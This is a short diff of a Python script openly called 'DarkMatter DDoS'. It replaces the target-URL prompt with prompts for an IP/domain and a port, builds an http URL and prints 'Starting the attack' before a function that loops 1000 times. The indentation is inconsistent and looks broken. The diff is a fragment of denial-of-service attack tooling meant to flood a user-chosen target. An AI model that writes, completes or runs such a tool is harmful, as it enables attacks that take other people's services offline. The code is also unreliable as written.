@@ -68,25 +68,12 @@ def attack():
     except:
       pass
 
-print("Bienvenido a DarkMatter DDoS\n")
-url = input("\nInsert URL/IP: ").strip()
-
-		if url == "":
-			print ("Please enter the url.")
-			starturl()
-
-		try:
-			if url[0]+url[1]+url[2]+url[3] == "www.":
-				url = "http://" + url
-			elif url[0]+url[1]+url[2]+url[3] == "http":
-				pass
-			else:
-				url = "http://" + url
-		except:
-			print("You mistyped, try again.")
-			starturl()
-print("[>>>] RS-28 Sarmat [<<<]")
-sleep(1)
+  print("Welcome To DarkMatter DDoS\n")
+ ip = input("IP/Domain: ")
+ port = int(input("Port: "))
+ url = f"http://{str(ip)}"
+ print("[>>>] Starting the attack [<<<]")
+ sleep(1)
 
 def send3attack():
   for i in range(1000): #Magic Power
